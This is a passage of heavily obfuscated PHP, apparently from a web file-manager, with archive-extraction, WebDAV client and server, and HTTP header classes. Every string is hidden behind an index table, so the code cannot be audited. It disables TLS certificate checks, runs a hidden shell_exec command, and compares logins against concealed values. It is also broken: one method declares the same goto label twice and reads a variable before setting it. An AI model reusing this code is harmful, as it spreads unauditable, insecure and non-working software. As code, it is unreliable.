(substr($Bݕ, 0, 1) != $C¦[8]) { $Bݕ = $C¦[1781] . $Bݕ . $C¦[1782]; } return preg_match($Bݕ, $E͏) === 1; } public static function get($E섽, $c狣Ĉ = null, $fʪ = null, $e󱬋 = null) { goto E; E: $Eу̨ =& $_SERVER[놫Ӱ]; $B = array(); if (!is_null($fʪ)) { $B[$Eу̨[34]] = $fʪ; } goto Bʶ; F: return $fؠ[$E섽]; goto A䴝; Bʶ: if (!is_null($e󱬋)) { $B[$Eу̨[983]] = $e󱬋; } if (!is_null($c狣Ĉ)) { $B[$Eу̨[1777]] = $c狣Ĉ; } $fؠ = Input::getArray(array($E섽 => $B)); goto F; A䴝: } } class KodArchive { static function init() { goto E˧; Cꌇ: define($e쟖[1785], TEMP_FILES); define($e쟖[1786], TEMP_FILES); define($e쟖[1787], $e쟖[1788]); goto Eֺ; E؏Ȣ: require_once ARCHIVE_LIB . $e쟖[1791]; require_once ARCHIVE_LIB . $e쟖[1792]; require_once ARCHIVE_LIB . $e쟖[1793]; goto D働; D働: require_once ARCHIVE_LIB . $e쟖[1794]; goto d; E˧: $e쟖 =& $_SERVER[놫Ӱ]; if (defined($e쟖[1783])) { return; } define($e쟖[1783], SDK_DIR . $e쟖[1784]); goto Cꌇ; Eֺ: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $e쟖[1789]; require_once ARCHIVE_LIB . $e쟖[1790]; goto E؏Ȣ; d: } static function checkIfType($fƝ, $d) { goto e٣; e٣: $FҠ݅ =& $_SERVER[놫Ӱ]; self::init(); $b = array($FҠ݅[298] => array($FҠ݅[298], $FҠ݅[1795], $FҠ݅[1796], $FҠ݅[1797]), $FҠ݅[1798] => array($FҠ݅[1798], $FҠ݅[1799], $FҠ݅[1800], $FҠ݅[1801]), $FҠ݅[1017] => array($FҠ݅[1017], $FҠ݅[1802], $FҠ݅[1803], $FҠ݅[1804], $FҠ݅[1805], $FҠ݅[1806], $FҠ݅[1807])); goto C; FԼ: return $D; goto F̙; C: $D = in_array($fƝ, $b[$d]); if ($D && ($d == $FҠ݅[298] || $d == $FҠ݅[1798]) && (!function_exists($FҠ݅[1808]) || !function_exists($FҠ݅[1809]))) { show_tips($FҠ݅[1810]); } if ($D && $d == $FҠ݅[1017] && (!function_exists($FҠ݅[1811]) || !strstr(shell_exec($FҠ݅[1812]), $FҠ݅[1813]))) { show_tips($FҠ݅[1814]); } goto FԼ; F̙: } static function listContent($dپ, $d = true) { $e =& $_SERVER[놫Ӱ]; self::init(); $A = $GLOBALS[$e[1018]] ? $GLOBALS[$e[1018]] : get_path_ext($dپ); $Bߘۇ = !1; if (self::checkIfType($A, $e[1798])) { $Fʓ = PclTarList($dپ, $A); $Bߘۇ = array(); for ($c掺ޅ = 0; $c掺ޅ < count($Fʓ); $c掺ޅ++) { $eќ = $Fʓ[$c掺ޅ]; if ($eќ[$e[1815]] == $e[1816] || $eќ[$e[1815]] == $e[1817]) { continue; } if ($d) { $eќ[$e[1818]] = ltrim($eќ[$e[1818]], $e[1111]); } if ($eќ[$e[1815]] == $e[1819]) { $eќ[$e[77]] = !0; } else { $eќ[$e[77]] = !1; } $eќ[$e[1009]] = $c掺ޅ; $Bߘۇ[] = $eќ; } } else { if (self::checkIfType($A, $e[1017])) { $B𳜥 = kodRarArchive::listContent($dپ); if (!$B𳜥[$e[1005]]) { return $B𳜥; } else { $Bߘۇ = $B𳜥[$e[1007]]; } } else { if (kodZipArchive::support($e[350])) { $Bߘۇ = kodZipArchive::listContent($dپ); } else { $dŨ = new PclZip($dپ); $Bߘۇ = $dŨ->listContent(); } } } if ($Bߘۇ) { $C = unzip_charset_get($Bߘۇ); $d = $d && function_exists($e[66]); for ($c掺ޅ = 0; $c掺ޅ < count($Bߘۇ); $c掺ޅ++) { $Bߘۇ[$c掺ޅ][$e[1818]] = str_replace(array($e[1040], $e[1820]), $e[756], $Bߘۇ[$c掺ޅ][$e[1818]]); if ($d) { $Bߘۇ[$c掺ޅ][$e[1818]] = iconv_to($Bߘۇ[$c掺ޅ][$e[1818]], $C, $e[323]); unset($Bߘۇ[$c掺ޅ][$e[1821]]); } } return array($e[1005] => !0, $e[1007] => $Bߘۇ); } else { return array($e[1005] => !1, $e[1007] => $Bߘۇ); } } static function extract($bꌷ, $A󅑑, $e˄ = "\x2d\61", &$Aڶ = false) { goto A; C徤: $DƘĵ = self::listContent($bꌷ, !1); if (!$DƘĵ[$D߾Ԩ[1005]]) { return $DƘĵ; } if ($e˄ != $D߾Ԩ[1004]) { goto Cш; bߦ: if ($cѾТ[$D߾Ԩ[77]]) { $Fʆ = rtrim($Fʆ, $D߾Ԩ[8]) . $D߾Ԩ[8]; $Aڶ = array($Aڶ); } $D = str_replace($D߾Ԩ[94], $D߾Ԩ[8], $Fʆ); if (substr($D, -1) == $D߾Ԩ[8]) { if (!strstr(trim($D, $D߾Ԩ[8]), $D߾Ԩ[8])) { $A󅑑 = $A󅑑 . get_path_this($D) . $D߾Ԩ[8]; } } else { if ($fװ == $Fʆ) { $fװ = $D߾Ԩ[33]; } } goto eՃ; Cш: $cѾТ = self::fileIndex($DƘĵ[$D߾Ԩ[1007]], $e˄); $Aڶ = str_replace(array($D߾Ԩ[1040], $D߾Ԩ[1820]), $D߾Ԩ[71], $cѾТ[$D߾Ԩ[1818]]); $Fʆ = $Aڶ; goto AͿ; AͿ: if ($GLOBALS[$D߾Ԩ[6]][$D߾Ԩ[1109]] != $D߾Ԩ[323]) { $Fʆ = unzip_pre_name($Aڶ); } $fװ = get_path_father($Aڶ); if ($fװ == $Aڶ) { $fװ = $D߾Ԩ[33]; } goto bߦ; eՃ: } goto F; F: if (self::checkIfType($d顲, $D߾Ԩ[1798])) { if ($e˄ != $D߾Ԩ[1004]) { $Fʆ = unzip_pre_name($Fʆ); $fװ = unzip_pre_name($fװ); $Fх = PclTarExtractList($bꌷ, array($Fʆ), $A󅑑, $fװ, $d顲); } else { $Fх = PclTarExtract($bꌷ, $A󅑑, $D߾Ԩ[358], $d顲); } return array($D߾Ԩ[1005] => $Fх, $D߾Ԩ[1007] => PclErrorString(!0)); } else { if (self::checkIfType($d顲, $D߾Ԩ[1017])) { return kodRarArchive::extract($bꌷ, $A󅑑, $d顲, $Aڶ); } else { if (kodZipArchive::support($D߾Ԩ[1822])) { return kodZipArchive::extract($bꌷ, $A󅑑, $Aڶ); } else { $dŬ = new PclZip($bꌷ); if ($e˄ != $D߾Ԩ[1004]) { $Fх = $dŬ->extract(PCLZIP_OPT_PATH, $A󅑑, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $D߾Ԩ[1823], PCLZIP_OPT_BY_NAME, $cѾТ[$D߾Ԩ[1818]], PCLZIP_OPT_REMOVE_PATH, $fװ, PCLZIP_OPT_REPLACE_NEWER); } else { $Fх = $dŬ->extract(PCLZIP_OPT_PATH, $A󅑑, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $D߾Ԩ[1823], PCLZIP_OPT_REPLACE_NEWER); } return array($D߾Ԩ[1005] => $Fх, $D߾Ԩ[1007] => $dŬ->errorName(!0)); } } } return array($D߾Ԩ[1005] => !1, $D߾Ԩ[1007] => $D߾Ԩ[1824]); goto B; A: $D߾Ԩ =& $_SERVER[놫Ӱ]; self::init(); $d顲 = $GLOBALS[$D߾Ԩ[1018]] ? $GLOBALS[$D߾Ԩ[1018]] : get_path_ext($bꌷ); goto C徤; B: } static function fileIndex($C­ę, $Fٖ, $F = false) { goto c̤; bʲ: $C = count($C­ę); for ($eÝå = 0; $eÝå < $C; $eÝå++) { if ($Fٖ == $C­ę[$eÝå][$aǟ[1009]]) { $bӢߤ = $C­ę[$eÝå]; break; } } if (!$bӢߤ) { show_tips($aǟ[1825]); } goto D᪕; c̤: $aǟ =& $_SERVER[놫Ӱ]; self::init(); if (!is_array($C­ę)) { return !1; } goto bʲ; D᪕: $B݃ = $bӢߤ; if ($F) { $B݃ = $bӢߤ[$F]; if ($bӢߤ[$aǟ[77]]) { $B݃ = rtrim($B݃, $aǟ[8]) . $aǟ[8]; } } return $B݃; goto F; F: } static function extractZipFile($dޤ, $A҉, $c = false) { goto E; D܍֤: if (file_exists($A؃)) { return $A؃; } $c͍ = new PclZip($dޤ); $a߽ = unzip_filter_ext($eõᣰ . get_path_this($A҉)); goto a򾙖; d: mk_dir($eõᣰ); $A؃ = $eõᣰ . md5($dޤ . $A҉); if ($c) { $A؃ = $eõᣰ . $c; } goto D܍֤; a򾙖: $E = get_path_father($A҉); if ($E == $A҉) { $E = $c͌¦[33]; } $ać = $c͍->extract(PCLZIP_OPT_PATH, $eõᣰ, PCLZIP_CB_PRE_FILE_NAME, $c͌¦[1823], PCLZIP_OPT_REMOVE_PATH, $E, PCLZIP_OPT_BY_NAME, $A҉); goto a샲; a샲: if (!file_exists($a߽)) { return !1; } @rename($a߽, $A؃); return $A؃; goto Dޒ͆; E: $c͌¦ =& $_SERVER[놫Ӱ]; self::init(); $eõᣰ = TEMP_FILES . hash_path($dޤ) . $c͌¦[8]; goto d; Dޒ͆: } static function filePreview($f, $b, $aɌ = false, $E = false) { goto cӽ; C쐖: if (!$Cڨ[$dȡ֠[1005]]) { show_json($Cڨ[$dȡ֠[1007]], !1); } if (!file_exists($d׊)) { show_json($dȡ֠[1827], !1); } @rename($d׊, $D); goto FŐ; cӽ: $dȡ֠ =& $_SERVER[놫Ӱ]; self::init(); $aݪᅴ = TEMP_FILES . hash_path($f) . $dȡ֠[8]; goto b鄻; DԄ: $Cڨ = self::extract($f, $aݪᅴ, $b, $eߺ); if (is_array($eߺ)) { show_json($dȡ֠[1826], !1); } if (file_exists($D)) { IO::fileOut($D, $aɌ, get_path_this($eߺ)); return; } goto Bઉ; Bઉ: $eߺ = unzip_pre_name($eߺ); $Fт޼ = get_path_this($eߺ); $d׊ = unzip_filter_ext($aݪᅴ . $Fт޼); goto C쐖; b鄻: mk_dir($aݪᅴ); $D = $aݪᅴ . md5($f . $b . $E); $eߺ = $dȡ֠[33]; goto DԄ; FŐ: if (!file_exists($D)) { del_dir($aݪᅴ); show_json($dȡ֠[1828]); } IO::fileOut($D, $aɌ, $Fт޼); goto B; B: } static function create($d, $dǔ) { $Fލ =& $_SERVER[놫Ӱ]; self::init(); $a맮 = get_path_ext($d); $Cސ = !1; if (self::checkIfType($a맮, $Fލ[298])) { if (kodZipArchive::support($Fލ[982])) { return kodZipArchive::create($d, $dǔ); } $e = new PclZip($d); foreach ($dǔ as $C => $D೏) { $D೏ = str_replace($Fލ[463], $Fލ[8], $D೏); $bӝњ = Kodio::clear(get_path_father($D೏)); if ($C == 0) { $Cސ = $e->create($D೏, PCLZIP_OPT_REMOVE_PATH, $bӝњ, PCLZIP_CB_PRE_FILE_NAME, $Fލ[1829]); continue; } $Cސ = $e->add($D೏, PCLZIP_OPT_REMOVE_PATH, $bӝњ, PCLZIP_CB_PRE_FILE_NAME, $Fލ[1829]); } } else { if (self::checkIfType($a맮, $Fލ[1798])) { foreach ($dǔ as $C => $D೏) { $D೏ = str_replace($Fލ[463], $Fލ[8], $D೏); $bӝњ = Kodio::clear(get_path_father($D೏)); if ($C == 0) { $Cސ = PclTarCreate($d, array($D೏), $a맮, null, $bӝњ); continue; } $Cސ = PclTarAddList($d, array($D೏), $Fލ[33], $bӝњ, $a맮); } } } return $Cސ; } } goto A; c: class HttpDavClient { public function __construct($Cߏ, $FԮ͊, $A) { $this->header = array(); $this->userName = $FԮ͊; $this->userPassowrd = $A; } protected function makePath($E) { return $E; } protected function setHeader($C, $e = false) { if ($e === !1) { $this->header[] = $C; } else { $this->header[] = $C . $_SERVER[놫Ӱ][873] . $e; } } public function move($B, $C̣, $D뭗 = '') { $e =& $_SERVER[놫Ӱ]; $this->setHeader($e[1666], $this->makePath($C̣)); $this->setHeader($e[1667], $e[1668]); if ($D뭗) { $this->setHeader($e[1669], $e[918] . $D뭗 . $e[921]); } return $this->send($e[1670], $B); } public function copy($F޸, $AӨ) { $fΒ߷ =& $_SERVER[놫Ӱ]; $this->setHeader($fΒ߷[1666], $this->makePath($AӨ)); $this->setHeader($fΒ߷[1667], $fΒ߷[1668]); return $this->send($fΒ߷[1671], $F޸); } public function mkcol($B٭) { $Aե =& $_SERVER[놫Ӱ]; $this->setHeader($Aե[1667], $Aե[1668]); return $this->send($Aե[1672], $B٭); } public function delete($eҍ, $DĎ = '') { $bǉ =& $_SERVER[놫Ӱ]; if ($DĎ) { $this->setHeader($bǉ[1669], $bǉ[918] . $DĎ . $bǉ[921]); } return $this->send($bǉ[1673], $eҍ); } public function propfind($eٱ) { $A͊ =& $_SERVER[놫Ӱ]; $this->setHeader($A͊[1674], $A͊[493]); $this->setHeader($A͊[1675], $A͊[1676]); $B̉͵ = $A͊[1677]; return $this->send($A͊[1678], $eٱ, $B̉͵); } public function options($C䣱ޝ) { return $this->send($_SERVER[놫Ӱ][1679], $C䣱ޝ); } public function get($A㞍ʗ) { return $this->send($_SERVER[놫Ӱ][213], $A㞍ʗ); } public function put($C髌, $a, $c܅ = '') { $f =& $_SERVER[놫Ӱ]; if ($c܅) { $this->setHeader($f[1669], $f[918] . $c܅ . $f[921]); } return $this->send($f[211], $C髌, $a); } protected function send($Dጢ, $A҇ٶ, $C񐱭 = false, $Ḑ = false) { goto C; a܎: $this->setHeader($f); if ($C񐱭) { $C񐱭 = $fߦ䆧[1681] . $C񐱭; } if (!request_url_safe($A҇ٶ)) { return !1; } goto C; DȎ: curl_setopt($fΦ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($fΦ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($fΦ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto F; F: curl_setopt($fΦ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($fΦ, CURLOPT_SSL_VERIFYHOST, !1); $f๵ = curl_exec($fΦ); goto B瘴; C: $fΦ = curl_init($A҇ٶ); curl_setopt($fΦ, CURLOPT_CUSTOMREQUEST, $Dጢ); curl_setopt($fΦ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto DȎ; C: $fߦ䆧 =& $_SERVER[놫Ӱ]; $f = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($fߦ䆧[1680], $fߦ䆧[50]); goto a܎; B瘴: $this->header = array(); return $f๵; goto c; c: } } class HttpDavServer { public function __construct($a査, $d؞) { $this->root = $a査; $this->initPath($d؞); $this->start(); } public function initPath($AȽ) { $cǼ =& $_SERVER[놫Ӱ]; $e = rtrim($_SERVER[$cǼ[1292]], $cǼ[8]) . $cǼ[8]; $this->urlBase = substr($e, 0, strpos($e, $AȽ) + 1); $this->urlBase = rtrim($this->urlBase, $cǼ[8]) . $AȽ; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $A¡ې =& $_SERVER[놫Ӱ]; $F֋ = HttpAuth::get(); if ($F֋[$A¡ې[527]] == $A¡ې[1682] && $F֋[$A¡ې[890]] == $A¡ې[1683]) { return !0; } HttpAuth::error(); } public function start() { goto d; Dܨ: if (!method_exists($this, $bƂ)) { pr($bƂ . $cւ㙂[1684]); die; } $b = array($cւ㙂[1685], $cւ㙂[1686]); if (!in_array($bƂ, $b) && !$this->pathExists($this->path)) { $bԂ = array($cւ㙂[1005] => 404); } else { $bԂ = $this->{$bƂ}(); } goto bչ; d: $cւ㙂 =& $_SERVER[놫Ӱ]; $this->checkUser(); $bƂ = $cւ㙂[141] . HttpHeader::method(); goto Dܨ; bչ: if (!$bԂ) { return; } self::response($bԂ); goto fϸ; fϸ: } public function pathGet($ań = false) { $d =& $_SERVER[놫Ӱ]; $Dג = $ań ? $_SERVER[$d[1687]] : $_SERVER[$d[1292]]; $Dג = KodIO::clear(rawurldecode($Dג)); if (!strstr($Dג, KodIO::clear($this->urlBase))) { return !1; } return substr($Dג, strpos($Dג, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($A݈) { return file_exists($A݈); } public function pathMkdir($D) { return mkdir($D, 511, !0); } public function pathInfo($dٕ) { return path_info($dٕ); } public function pathList($FŇ¾) { return path_list($FŇ¾); } public function pathOut($B) { echo file_get_contents($B); } public function pathPut($Eӵٔ, $cʯ = '') { if (!$cʯ) { return file_put_contents($Eӵٔ, $_SERVER[놫Ӱ][33]); } return move_path($cʯ, $Eӵٔ); } public function pathRemove($fΑ) { if (is_file($fΑ)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($f, $Fʴ) { return move_path($f, $Fʴ); } public function pathCopy($d毖Ṛ, $EĝС) { return copy_dir($d毖Ṛ, $EĝС); } public function parsePath($DЩ) { return $DЩ; } public function parseItem($b۸) { goto b; b: $Dđ =& $_SERVER[놫Ӱ]; $eݪ = $this->pathGet() . $Dđ[8] . $b۸[$Dđ[28]]; $eݪ = str_replace($Dđ[169], $Dđ[8], rawurlencode($eݪ)); goto Bߏ; C쨍: return $D憐; goto eܜɉְ; Bߏ: if (!trim($b۸[$Dđ[106]])) { $b۸[$Dđ[106]] = time(); } if (!trim($b۸[$Dđ[184]])) { $b۸[$Dđ[184]] = time(); } $D憐 = array($Dđ[1688] => KodIO::clear($this->urlBase . $Dđ[8] . $eݪ), $Dđ[106] => @gmdate($Dđ[1689], $b۸[$Dđ[106]]), $Dđ[184] => @gmdate($Dđ[1690], $b۸[$Dđ[184]]), $Dđ[78] => $b۸[$Dđ[78]] ? $b۸[$Dđ[78]] : 0); goto C쨍; eܜɉְ: } public function parseItemXml($d) { $C =& $_SERVER[놫Ӱ]; $E矗 = $this->parseItem($d); if ($d[$C[29]] == $C[77]) { $Bĺ = $C[1691]; $Bĺ .= $C[1692]; } else { $Fꏵ = $d[$C[157]] ? $d[$C[157]] : get_path_ext($d[$C[28]]); $D = get_file_mime($Fꏵ); $Bĺ = $C[1693]; $Bĺ .= "\74\104\x3a\x67\145\164\143\157\156\x74\x65\x6e\x74\x74\171\x70\145\x3e{$D}\x3c\x2f\x44\x3a\x67\145\x74\x63\x6f\x6e\164\145\156\x74\x74\171\160\145\x3e"; } return "\xa\x9\x9\74\x44\72\162\x65\x73\160\x6f\156\x73\145\x3e\12\x9\11\11\74\x44\x3a\150\162\x65\146\x3e{$E矗[$C[1688]]}\x3c\x2f\x44\x3a\150\x72\x65\x66\76\xa\11\x9\x9\x3c\104\x3a\160\162\157\160\163\x74\141\x74\x3e\xa\x9\x9\11\11\74\104\72\x70\162\x6f\160\76\12\11\x9\x9\x9\x9\x3c\x44\x3a\147\145\164\154\x61\x73\164\x6d\157\x64\151\146\151\x65\x64\76{$E矗[$C[106]]}\x3c\x2f\104\72\x67\145\x74\x6c\141\x73\164\155\x6f\x64\151\146\x69\x65\x64\x3e\xa\11\x9\x9\x9\x9\x3c\104\72\143\162\x65\x61\x74\151\157\156\144\x61\164\145\76{$E矗[$C[184]]}\74\x2f\x44\x3a\143\162\145\141\x74\x69\157\156\144\141\164\145\76\12\11\x9\11\11\11\x3c\x44\x3a\147\145\x74\143\157\156\x74\145\156\164\154\145\x6e\x67\x74\x68\x3e{$E矗[$C[78]]}\x3c\57\104\72\x67\x65\164\143\x6f\156\164\145\x6e\x74\154\x65\156\x67\x74\x68\76\12\x9\x9\x9\x9\x9{$Bĺ}\12\x9\x9\x9\x9\74\x2f\x44\72\160\x72\157\160\76\xa\x9\11\11\11\x3c\x44\x3a\x73\164\x61\164\165\163\76\110\x54\x54\x50\x2f\x31\x2e\61\x20\x32\60\60\40\117\113\74\x2f\104\72\x73\164\141\x74\165\163\x3e\xa\x9\x9\11\74\x2f\x44\x3a\x70\162\x6f\160\x73\x74\x61\164\x3e\12\11\x9\74\57\104\72\162\145\x73\x70\x6f\156\163\145\76"; } public function pathListMerge($cΠ) { goto FΣ; d͂: return $Cٲ; goto dﰂ; FΣ: $fэ =& $_SERVER[놫Ӱ]; if (!$cΠ) { return $cΠ; } $E = array($fэ[74], $fэ[75], $fэ[1694]); goto f; f: $Cٲ = array(); foreach ($cΠ as $A => $Aχ) { if (!in_array($A, $E) || !is_array($Aχ)) { continue; } $Cٲ = array_merge($Cٲ, $Aχ); } foreach ($Cٲ as &$c蔄) { $c蔄[$fэ[28]] = str_replace($fэ[8], $fэ[1294], $c蔄[$fэ[28]]); } goto d͂; dﰂ: } public function httpPROPFIND() { goto Cڹ; Aέ: if ($b܆) { $c֍ڗ[$fѥ[184]] = $b܆[$fѥ[184]]; $c֍ڗ[$fѥ[106]] = $b܆[$fѥ[106]]; $c֍ڗ[$fѥ[157]] = $b܆[$fѥ[157]]; $c֍ڗ[$fѥ[29]] = $b܆[$fѥ[29]]; } $b = HttpHeader::get($fѥ[1674]); if ($c֍ڗ[$fѥ[29]] == $fѥ[164]) { $b = $fѥ[464]; } goto Bԭ; E夊ㄴ: return array($fѥ[1695] => 207, $fѥ[1696] => "\x3c\x44\72\155\165\154\x74\151\x73\x74\141\x74\x75\163\40\170\x6d\154\x6e\x73\72\x44\75\x22\104\x41\126\x3a\x22\x3e\12{$b}\12\74\57\104\72\155\x75\x6c\164\x69\163\x74\x61\164\x75\163\76"); goto bĳ; d: if (!is_array($eǏ)) { return array($fѥ[1695] => 404, $fѥ[1696] => $fѥ[1697]); } $b܆ = IO::info($this->path); $c֍ڗ = array($fѥ[383] => $fѥ[33], $fѥ[29] => $fѥ[77]); goto Aέ; Cڹ: $fѥ =& $_SERVER[놫Ӱ]; $eǏ = $this->pathList($this->path); $eǏ = $this->pathListMerge($eǏ); goto d; Bԭ: if ($b == $fѥ[464]) { $eǏ = array($c֍ڗ); } else { $eǏ = array_merge(array($c֍ڗ), $eǏ); } $b = $fѥ[33]; foreach ($eǏ as $dܧ) { $b .= $this->parseItemXml($dܧ); } goto E夊ㄴ; bĳ: } public function httpHEAD() { $eȄ猙 =& $_SERVER[놫Ӱ]; $EĴ = $this->pathInfo($this->path); if (!$EĴ || $EĴ[$eȄ猙[29]] == $eȄ猙[77]) { return array($eȄ猙[1005] => 200, $eȄ猙[1163] => array($eȄ猙[1698])); } return array($eȄ猙[1005] => 200, $eȄ猙[1163] => array($eȄ猙[1699], $eȄ猙[135], $eȄ猙[1700] . $EĴ[$eȄ猙[78]], $eȄ猙[1701] . get_file_mime($EĴ[$eȄ猙[157]]), $eȄ猙[131] . gmdate($eȄ猙[1689], $EĴ[$eȄ猙[1207]]) . $eȄ猙[1702], $eȄ猙[1703])); } public function httpOPTIONS() { $A =& $_SERVER[놫Ӱ]; return array($A[1005] => 200, $A[1163] => array($A[1704], $A[1705], $A[1706], $A[1664])); } public function httpPROPPATCH() { $AŤ⊵ =& $_SERVER[놫Ӱ]; $A⊷ = $AŤ⊵[1707] . $_SERVER[$AŤ⊵[1292]] . $AŤ⊵[1708]; return array($AŤ⊵[1695] => 207, $AŤ⊵[1696] => "\74\104\x3a\x6d\165\154\x74\151\163\164\x61\164\x75\163\x20\x78\x6d\x6c\x6e\163\x3a\x44\75\x22\x44\x41\126\72\x22\x3e\12{$A⊷}\12\x3c\x2f\104\x3a\x6d\x75\x6c\164\x69\x73\x74\141\164\x75\x73\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $Fж =& $_SERVER[놫Ӱ]; $Aǉޝ = $this->uploadFile(); if ($Aǉޝ) { $AƟ = 204; } else { $Aǉޝ = $Fж[33]; $AƟ = 201; } $b宙蒬 = $this->pathPut($this->path, $Aǉޝ); if ($b宙蒬 == !1) { $AƟ = 404; } return array($Fж[1695] => $AƟ); } private function uploadFile() { goto b墵ޝ; fޕ: $Dʢ = @fopen($B, $Aن[1419]); $Bق = @fopen($Aن[1710], $Aن[1418]); if (!$Bق || !$Dʢ) { @unlink($B); return !1; } goto dڏ㓖; a: if (@filesize($B) > 0) { return $B; } @unlink($B); return !1; goto bڌ; dڏ㓖: while (!feof($Bق)) { fwrite($Dʢ, fread($Bق, 1024 * 200)); } fclose($Bق); fclose($Dʢ); goto a; b墵ޝ: $Aن =& $_SERVER[놫Ӱ]; @mk_dir(TEMP_FILES); $B = TEMP_FILES . $Aن[1709] . rand_string(32); goto fޕ; bڌ: } public function httpMKCOL() { $Cò =& $_SERVER[놫Ӱ]; if ($this->pathExists($this->path)) { return array($Cò[1005] => 409); } $e햱 = $this->pathMkdir($this->path); return array($Cò[1005] => $e햱 ? 201 : 403); } public function httpMOVE() { $E严 =& $_SERVER[놫Ӱ]; $Aٓ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$E严[1711]])) { $Fҧµ[$E严[1712]] = $_SERVER[$E严[1711]] == $E严[1713]; } $FИǠ = $this->pathMove($this->path, $Aٓ); return array($E严[1005] => $FИǠ ? 201 : 404); } public function httpCOPY() { $b۟ = $this->parsePath($this->pathGet(!0)); $Aƍ = $this->pathCopy($this->path, $b۟); return array($_SERVER[놫Ӱ][1005] => $Aƍ ? 201 : 404); } public function httpDELETE() { $b = $this->pathRemove($this->path); return array($_SERVER[놫Ӱ][1005] => $b ? 200 : 503); } public function httpLOCK() { $aЋ =& $_SERVER[놫Ӱ]; $B܂𗲖 = md5($this->path); $e̒ = $aЋ[1714] . $this->xmlGet($aЋ[1715]) . $aЋ[1716] . $B܂𗲖 . $aЋ[1717]; return array($aЋ[1005] => 200, $aЋ[1163] => array($aЋ[1718] . $B܂𗲖, $aЋ[1719]), $aЋ[1720] => $e̒); } public function httpUNLOCK() { return array($_SERVER[놫Ӱ][1005] => 204); } public function xmlGet($B) { goto E; E: $dЃ =& $_SERVER[놫Ӱ]; static $c = false; if (!$c) { $BŇ = file_get_contents($dЃ[1721]); $c = new DOMDocument(); $c->loadXML($BŇ); } goto eϒ; eϒ: $Dˋ = array_shift(explode($dЃ[8], $B)); $bÒ = $c->getElementsByTagNameNS($dЃ[1722], $Dˋ); if ($bÒ) { return $bÒ[0]->nodeValue; } goto D; D: return $dЃ[33]; goto b; b: } public static function response($C) { goto F帺; Dߺ˚: $A幃Ʋ[] = $bڨ݂[1662]; $A幃Ʋ[] = $bڨ݂[1663]; foreach ($A幃Ʋ as $D) { header($D); } goto f§ח; F帺: $bڨ݂ =& $_SERVER[놫Ӱ]; $A幃Ʋ = is_array($C[$bڨ݂[1163]]) ? $C[$bڨ݂[1163]] : array(); $A幃Ʋ[] = HttpHeader::code($C[$bڨ݂[1005]]); goto Dߺ˚; f§ח: if (is_string($C[$bڨ݂[1720]])) { header($bڨ݂[1723]); $EȆ = $bڨ݂[1724] . $bڨ݂[214] . $C[$bڨ݂[1720]]; echo $EȆ; } goto A; A: } } class HttpHeader { public static $_headers = array("\110\157\x73\164" => "\x48\x54\x54\120\x5f\x48\x4f\123\x54", "\x55\x73\145\162\x2d\x41\147\x65\156\x74" => "\x48\x54\x54\x50\x5f\x55\x53\105\x52\137\x41\x47\x45\116\x54", "\103\157\156\164\x65\x6e\164\x2d\124\x79\x70\145" => "\x48\x54\x54\x50\137\103\x4f\x4e\124\105\116\124\137\x54\x59\120\105", "\x43\x6f\156\164\x65\156\164\55\x4c\x65\x6e\x67\164\x68" => "\110\x54\124\x50\137\x43\117\116\x54\x45\x4e\124\137\x4c\x45\x4e\x47\x54\110", "\x44\145\x70\x74\x68" => "\x48\x54\x54\120\137\104\105\120\124\x48", "\105\x78\160\x65\143\x74" => "\110\x54\x54\120\137\105\x58\120\105\103\124", "\x49\x66\55\x4e\x6f\x6e\x65\55\x4d\141\164\x63\150" => "\x48\x54\124\x50\137\x49\x46\137\x4e\117\116\x45\x5f\x4d\101\x54\x43\x48", "\x49\146\55\x4d\141\x74\143\150" => "\x48\x54\124\120\137\x49\x46\x5f\x4d\x41\x54\x43\x48", "\x49\x66\x2d\122\x61\x6e\x67\x65" => "\110\x54\124\x50\137\x49\x46\x5f\122\x41\x4e\x47\105", "\x4c\141\163\x74\55\115\x6f\144\151\146\151\x65\144" => "\x48\x54\124\120\x5f\114\101\x53\x54\137\115\117\104\111\x46\x49\x45\104", "\111\x66\x2d\115\x6f\x64\151\146\151\145\x64\55\x53\151\x6e\x63\x65" => "\110\124\x54\120\x5f\x49\106\137\x4d\117\x44\111\106\111\105\104\x5f\x53\111\116\103\x45", "\x49\x66\x2d\125\x6e\x6d\x6f\x64\151\146\151\145\x64\x2d\123\151\x6e\143\145" => "\110\124\124\x50\x5f\x49\x46\x5f\x55\116\x4d\117\x44\111\x46\111\105\x44\137\x53\111\x4e\x43\x45", "\x52\x61\156\x67\x65" => "\x48\x54\x54\120\137\x52\x41\x4e\x47\105", "\x54\x69\x6d\x65\157\165\164" => "\x48\124\124\120\137\x54\111\x4d\105\x4f\x55\124", "\111\146" => "\x48\x54\x54\x50\137\111\106", "\114\157\143\x6b\x2d\x54\157\x6b\145\x6e" => "\x48\x54\124\x50\137\114\117\x43\113\x5f\124\x4f\113\105\x4e", "\x4f\166\x65\x72\167\162\151\164\145" => "\110\x54\x54\120\x5f\117\126\105\122\127\x52\x49\x54\x45", "\104\145\163\x74\151\x6e\x61\164\151\157\x6e" => "\x48\124\x54\120\x5f\104\105\123\x54\x49\116\x41\x54\111\x4f\116", "\x52\x65\x71\165\x65\x73\164\x2d\111\x64" => "\122\105\x51\125\105\x53\124\x5f\111\x44", "\x52\145\x71\x75\x65\163\164\x2d\102\x6f\x64\171\x2d\106\151\154\145" => "\122\105\x51\125\x45\123\124\137\102\117\x44\131\x5f\106\x49\114\105", "\x52\145\x64\151\x72\145\x63\164\x2d\x53\164\141\x74\x75\x73" => "\122\105\x44\111\x52\x45\103\124\x5f\x53\124\x41\124\x55\123"); public static function init() { static $Fݾ = false; if ($Fݾ) { return; } foreach ($_SERVER as $BΨ => $Eỷ) { $BΨ = strtoupper($BΨ); if (!array_key_exists($BΨ, $_SERVER)) { 